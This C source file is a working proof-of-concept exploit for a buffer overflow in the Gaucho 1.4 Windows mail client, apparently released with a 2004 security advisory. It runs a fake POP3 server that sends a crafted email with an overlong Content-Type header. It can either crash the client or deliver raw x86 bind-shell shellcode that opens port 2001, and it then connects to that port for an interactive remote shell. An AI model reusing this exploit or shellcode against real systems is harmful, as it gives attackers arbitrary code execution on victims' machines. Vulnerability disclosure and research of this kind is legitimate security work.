//**************************************************************************
// Gaucho Ver 1.4 Mail Client Buffer Overflow Vulnerability
// Bind Shell POC Validation Code for English Win2K SP4
// 10 Aug 2004
//
// Gaucho is an Email client developed by NakedSoft for Microsoft Windows 
// platforms.  Gaucho supports SMTP, POP3 and other email delivery protocols.
// Gaucho version 1.4 is vulnerable to a buffer overflow when receiving 
// malformed emails from a POP3 server.  This vulnerability is triggered if the 
// POP3 server returns a specially crafted email that has an abnormally long 
// string in the Content-Type field of the email header. This string will
// overwrite EIP via SEH, and can be exploited to execute arbitrary code.
//
// This POC code simulates a POP3 server that sends a specially crafted email 
// to Gaucho, triggering the overflow and binds shell on port 2001 of a vulnerable 
// Gaucho email client.
//
// Tested on Win2K SP4, you must find the address of JMP EDI instruction that 
// is suitable for your system.
//
// Advisory 
// http://www.security.org.sg/vuln/gaucho140.html
//
// Greetz: snooq, sk, and all guys at SIG^2 (www.security.org.sg)
//
//**************************************************************************

#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <conio.h>
#pragma comment(lib,"ws2_32.lib")

bool tcpInit()
{
	WORD wVersionRequested;
	WSADATA wsaData;
	int err;
 
	wVersionRequested = MAKEWORD( 2, 0 );
 
	err = WSAStartup( wVersionRequested, &wsaData );
	if ( err != 0 ) {
		return false;
	}
  
	if (LOBYTE( wsaData.wVersion ) != 2 ||
        HIBYTE( wsaData.wVersion ) != 0 )
	{
		WSACleanup();
		return false;
	}

	return true;
}


SOCKET tcpListen(int port)
{
    SOCKET sock;

	sock = socket(AF_INET, SOCK_STREAM, 0);

	if(sock == INVALID_SOCKET)
		return sock;

	sockaddr_in sin;

	sin.sin_addr.s_addr = htonl(INADDR_ANY);
	sin.sin_family = AF_INET;
	sin.sin_port = htons(port);

	if(bind(sock, (sockaddr *)&sin, sizeof(sin)) == SOCKET_ERROR)
	{
		printf("Error in bind().\n");
		closesocket(sock);
		return INVALID_SOCKET;
	}

	if(listen(sock, 5) == SOCKET_ERROR)
	{
		printf("Error in bind().\n");
		closesocket(sock);
		return INVALID_SOCKET;
	}

	return sock;
}


DWORD resolveIP(char *hostName)
{
	hostent *hent;
	char **addresslist;
	DWORD result = 0;

	hent = gethostbyname(hostName);
	if(hent)
	{
		addresslist = hent->h_addr_list;
	
		if (*addresslist) 
		{
			result = *((DWORD *)(*addresslist));

		}
	}

	return result;
}


SOCKET tcpConnect(char *host, int port)
{
    SOCKET sock;

	sock = socket(AF_INET, SOCK_STREAM, 0);

	if(sock == INVALID_SOCKET)
		return sock;

	sockaddr_in sin;

	DWORD ip = resolveIP(host);
	if(ip == 0)
		ip = inet_addr(host);

	sin.sin_addr.s_addr = ip;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(port);

    if(connect(sock, (sockaddr *)&sin, sizeof(sin)) == SOCKET_ERROR)
	{
		printf("Connect failed.\n");
		closesocket(sock);
		return INVALID_SOCKET;
	}

	return sock; 
}


void shell(int sockfd)
{
	char buffer[1024];
	fd_set rset;
	FD_ZERO(&rset);

	for(;;)
	{
		if(kbhit() != 0)
		{		
			fgets(buffer, sizeof(buffer) - 2, stdin);
			send(sockfd, buffer, strlen(buffer), 0);
		}

		FD_ZERO(&rset);
		FD_SET(sockfd, &rset);

		timeval tv;
		tv.tv_sec = 0;
		tv.tv_usec = 50;
		
		if(select(0, &rset, NULL, NULL, &tv) == SOCKET_ERROR)
		{
			printf("select error\n");
			break;
		}
        
		if(FD_ISSET(sockfd, &rset))
		{
			int n;

			ZeroMemory(buffer, sizeof(buffer));
			if((n = recv(sockfd, buffer, sizeof(buffer), 0)) <= 0)
			{
				printf("EOF\n");
				exit(0);
			}
			else
			{
				fwrite(buffer, 1, n, stdout);
			}
		}
	}
}


#define OK_MSG			"+OK POC POP3 server for Gaucho Ver 1.4 Vulnerability ready.\r\n"
#define STAT_REPLY		"+OK 1 1\r\n"


char UIDL_REPLY[] =
	"1 0123456789012345678901234567890123456789\r\n.\r\n";


unsigned char bindShellEmail[] =
	"Date: Mon, 09 Aug 2004 19:44:13 +0800\r\n"
	"Subject: Testing\r\n"
	"To: a@aaaaaa.xxx\r\n"
	"From: XX <xx@xxxxxxxx.xxx.xx>\r\n"
	"Message-ID: <GM109205179359A000.b76.xx@xxxxxxxx.xxx.xx>\r\n"
	"MIME-Version: 1.0\r\n"
	"Content-Type: "	
	"AAAABBBBCCCCDDDDEEEEFFFFGGGG1HHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"
	"AAAABBBBCCCCDDDDEEEEFFFFGGGG"	
	"\x37\x55\x62\x76"		// overwrites EIP via SEH, address of JMP EDI in MPR.dll
							// this address must be carefully chosen due to the filtering that is done
							// on the header messages.

	"IIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"
	"AAAABBBBCCCCDDDDEEEEFFFFGGGG3HHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"
	"AAAABBBBCCCCDDDDEEEEFFFFGGGG4HHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"
	"AAAABBBBCCCCDDDDEEEEFFFFGGGG5HHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"
	"AAAABBBBCCCCDDDDEEEEFFFFGGGG6HHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"
	"AAAABBBBCCCCDDDDEEEEFFFFGGGG7HHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"
	"AAAABBBBCCCCDDDDEEEEFFFFGGGG8HHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"
	"AAAABBBBCCCCDDDDEEEEFFFFGGGG9HHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"
	"AAAABBBBCCCCDDDDEEEEFFFFGGGGAHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"
	"AAAABBBBCCCCDDDDEEEEFFFFGGGGBHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"
	"AAAABBBBCCCCDDDDEEEEFFFFGGGGCHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"
	"AAAABBBBCCCCDDDDEEEEFFFFGGGG"
	"\xEB\x60"					// FIRST jmp lands us here, do a SECOND jmp to land onto shellcode
	"HHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"
	";"
	"\x90\x90\xEB\x61"			// JMP EDI lands here, do the FIRST jmp here to reach the SECOND jmp
	"set=US-ASCII\r\n"
	"\r\n"
	"\x90\x90"					// shellcode sent in email body to avoid filtering (bindshell on 2001)
	"\xEB\x62\x55\x8B\xEC\x51\x56\x57\x8B\x5D\x08\x8B\x73\x3C\x8B\x74"
	"\x33\x78\x03\xF3\x8B\x7E\x20\x03\xFB\x8B\x4E\x18\x56\x33\xD2\x8B"
	"\x37\x03\x75\x08\x33\xDB\x33\xC0\xAC\x85\xC0\x74\x09\xC1\xCB\x0C"
	"\xD1\xCB\x03\xD8\xEB\xF0\x3B\x5D\x0C\x74\x0B\x83\xC7\x04\x42\xE2"
	"\xDE\x5E\x33\xC0\xEB\x17\x5E\x8B\x7E\x24\x03\x7D\x08\x66\x8B\x04"
	"\x57\x8B\x7E\x1C\x03\x7D\x08\x8B\x04\x87\x03\x45\x08\x5F\x5E\x59"
	"\x8B\xE5\x5D\xC3\x55\x8B\xEC\x33\xC9\xB1\xC8\x2B\xE1\x32\xC0\x8B"
	"\xFC\xF3\xAA\xB1\x30\x64\x8B\x01\x8B\x40\x0C\x8B\x70\x1C\xAD\x8B"
	"\x58\x08\x89\x5D\xFC\x68\x8E\x4E\x0E\xEC\xFF\x75\xFC\xE8\x70\xFF"
	"\xFF\xFF\x83\xC4\x08\xBB\xAA\xAA\x6C\x6C\xC1\xEB\x10\x53\x68\x33"
	"\x32\x2E\x64\x68\x77\x73\x32\x5F\x54\xFF\xD0\x89\x45\xF8\xEB\x35"
	"\x5E\x8D\x7D\xF4\x33\xC9\xB1\x09\xFF\x36\xFF\x75\xFC\xE8\x40\xFF"
	"\xFF\xFF\x83\xC4\x08\x85\xC0\x75\x0E\x90\xFF\x36\xFF\x75\xF8\xE8"
	"\x2E\xFF\xFF\xFF\x83\xC4\x08\x89\x07\x33\xC0\xB0\x04\x03\xF0\x2B"
	"\xF8\xE2\xD5\xEB\x29\xE8\xC6\xFF\xFF\xFF\x72\xFE\xB3\x16\x35\x54"
	"\x8A\xA1\xA4\xAD\x2E\xE9\xA4\x1A\x70\xC7\xD9\x09\xF5\xAD\xCB\xED"
	"\xFC\x3B\xEF\xCE\xE0\x60\xE7\x79\xC6\x79\xAD\xD9\x05\xCE\x54\x6A"
	"\x02\xFF\x55\xE0\x33\xC0\x50\x50\x50\x50\x6A\x01\x6A\x02\xFF\x55"
	"\xE4\x89\x45\xD0\x33\xC0\x50\xB8\xFD\xFF\xF8\x2E\x83\xF0\xFF\x50"
	"\x8B\xC4\x6A\x10\x50\xFF\x75\xD0\xFF\x55\xE8\x6A\x05\xFF\x75\xD0"
	"\xFF\x55\xEC\x85\xC0\x75\x68\x8B\xCC\x6A\x10\x8B\xDC\x33\xC0\x50"
	"\x50\x53\x51\xFF\x75\xD0\xFF\x55\xF0\x8B\xD0\x5B\x83\xF0\xFF\x74"
	"\x4E\x8B\xFC\x33\xC9\xB1\x64\x33\xC0\xF3\xAA\xC6\x04\x24\x44\x66"
	"\xC7\x44\x24\x2C\x01\x01\x89\x54\x24\x38\x89\x54\x24\x3C\x89\x54"
	"\x24\x40\x8B\xC4\x8D\x58\x44\xB9\xFF\x63\x6D\x64\xC1\xE9\x08\x51"
	"\x8B\xCC\x52\x53\x53\x50\x33\xC0\x50\x50\x50\x6A\x01\x50\x50\x51"
	"\x50\xFF\x55\xF4\x5B\x6A\xFF\xFF\x33\xFF\x55\xD4\xFF\x55\xD8\xFF"
	"\x75\xD0\xFF\x55\xD8\x50\xFF\x55\xDC"
	"\r\n"
	".\r\n";

unsigned char pocEmail[] =
	"Date: Mon, 09 Aug 2004 19:44:13 +0800\r\n"
	"Subject: Testing\r\n"
	"To: a@aaaaaa.xxx\r\n"
	"From: XX <xx@xxxxxxxx.xxx.xx>\r\n"
	"Message-ID: <GM109205179359A000.b76.xx@xxxxxxxx.xxx.xx>\r\n"
	"MIME-Version: 1.0\r\n"
	"Content-Type: "	
	"AAAABBBBCCCCDDDDEEEEFFFFGGGG1HHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"
	"AAAABBBBCCCCDDDDEEEEFFFFGGGG"			
	"HHHH"			// overwrites EIP via SEH
	"IIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"
	"AAAABBBBCCCCDDDDEEEEFFFFGGGG3HHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"
	"AAAABBBBCCCCDDDDEEEEFFFFGGGG4HHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"
	"AAAABBBBCCCCDDDDEEEEFFFFGGGG5HHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"
	"AAAABBBBCCCCDDDDEEEEFFFFGGGG6HHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"
	"AAAABBBBCCCCDDDDEEEEFFFFGGGG7HHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"
	"AAAABBBBCCCCDDDDEEEEFFFFGGGG8HHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"
	"AAAABBBBCCCCDDDDEEEEFFFFGGGG9HHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"
	"AAAABBBBCCCCDDDDEEEEFFFFGGGGAHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"
	"AAAABBBBCCCCDDDDEEEEFFFFGGGGBHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"
	"AAAABBBBCCCCDDDDEEEEFFFFGGGGCHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"
	"AAAABBBBCCCCDDDDEEEEFFFFGGGGDHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"
	"; charset=US-ASCII\r\n"
	"Content-Transfer-Encoding: 7bit\r\n"
	"X-Mailer: Gaucho Version 1.4.0 Build 145\r\n"
	"\r\n"
	"Testing\r\n"
	"\r\n"
	".\r\n";


void genUIDLreply(char *ptr)
{
	srand(GetTickCount());
	for(int i = 2; i < 42; i++)
	{
		ptr[i] = (rand() % 94) + 0x21;
	}
}

void printUsage(char *filename)
{
	printf("\nUsage: %s <mode>\n\n", filename);
	printf("  Mode can be:\n");
	printf("  1 - POC Crash\n"
		   "  2 - Bindshell on Port 2001 (JMP EDI address is hardcoded for Win2K SP4)\n\n");
}

int main(int argc, char* argv[])
{
	printf("Proof-of-Concept POP3 server for Gaucho Ver 1.4 Vulnerability\n");
	if(argc != 2)
	{
		printUsage(argv[0]);
		return 1;
	}

	int mode = atoi(argv[1]);
	if(mode != 1 && mode != 2)
	{
		printf("\nINVALID MODE!\n");
		printUsage(argv[0]);
		return 1;
	}

	if(!tcpInit())
	{
		printf("Cannot start Winsock!\n");
		return 1;
	}
	SOCKET s = tcpListen(110);
	if(s == INVALID_SOCKET)
	{
		printf("Cannot create listening socket!\n");
		return 1;
	}
	printf("Listening on POP3 port 110...\n");
	
	struct sockaddr_in sin;
	int sin_size = sizeof(sin);
	SOCKET client = WSAAccept(s, (SOCKADDR *)&sin, &sin_size, NULL, 0);
	char buffer[1024];
	int recvSize;

	if(client != INVALID_SOCKET)
	{
		// POP3 banner
		send(client, OK_MSG, strlen(OK_MSG), 0);
		recvSize = recv(client, buffer, sizeof(buffer), 0);
		if(recvSize <= 0)
			return 1;			

		fwrite(buffer, recvSize, 1, stdout);

		// OK to USER
		send(client, OK_MSG, strlen(OK_MSG), 0);
		recvSize = recv(client, buffer, sizeof(buffer), 0);
		if(recvSize <= 0)
			return 1;			

		fwrite(buffer, recvSize, 1, stdout);

		// OK to PASS
		send(client, OK_MSG, strlen(OK_MSG), 0);
		recvSize = recv(client, buffer, sizeof(buffer), 0);
		if(recvSize <= 0)
			return 1;			

		fwrite(buffer, recvSize, 1, stdout);

		// REPLY to STAT
		send(client, STAT_REPLY, strlen(STAT_REPLY), 0);
		recvSize = recv(client, buffer, sizeof(buffer), 0);
		if(recvSize <= 0)
			return 1;			

		fwrite(buffer, recvSize, 1, stdout);
		
		// REPLY to UIDL
		genUIDLreply(UIDL_REPLY);
		send(client, STAT_REPLY, strlen(STAT_REPLY), 0);
		send(client, UIDL_REPLY, strlen(UIDL_REPLY), 0);
		recvSize = recv(client, buffer, sizeof(buffer), 0);
		if(recvSize <= 0)
			return 1;			

		fwrite(buffer, recvSize, 1, stdout);

		// REPLY to LIST
		send(client, STAT_REPLY, strlen(STAT_REPLY), 0);		
		recvSize = recv(client, buffer, sizeof(buffer), 0);
		if(recvSize <= 0)
			return 1;			

		fwrite(buffer, recvSize, 1, stdout);

		if(mode == 1)
		{
			// send malicious email
			send(client, (char *)pocEmail, strlen((char *)pocEmail), 0);			
			printf("POC crash email sent...\n");

			recvSize = recv(client, buffer, sizeof(buffer), 0);
			if(recvSize <= 0)
				return 1;			

			fwrite(buffer, recvSize, 1, stdout);
		}
		else
		{
			// send malicious email
			send(client, (char *)bindShellEmail, strlen((char *)bindShellEmail), 0);
			printf("Bindshell email sent.  Sleeping for 2 seconds...\n");
			Sleep(2000);			

			//================================= Connect to the target ==============================
			SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
			if(sock == INVALID_SOCKET)
			{
				printf("Invalid socket return in socket() call.\n");
				WSACleanup();
				return -1;
			}

			sin.sin_family = AF_INET;
			sin.sin_port = htons(2001);			

			if(connect(sock, (sockaddr *)&sin, sizeof(sin)) == SOCKET_ERROR)
			{
				printf("Exploit Failed. SOCKET_ERROR return in connect call.\n");
				closesocket(sock);
				WSACleanup();
				return -1;
			}
			
			printf("\n");
			shell(sock);
		}
	}

	return 0;
}
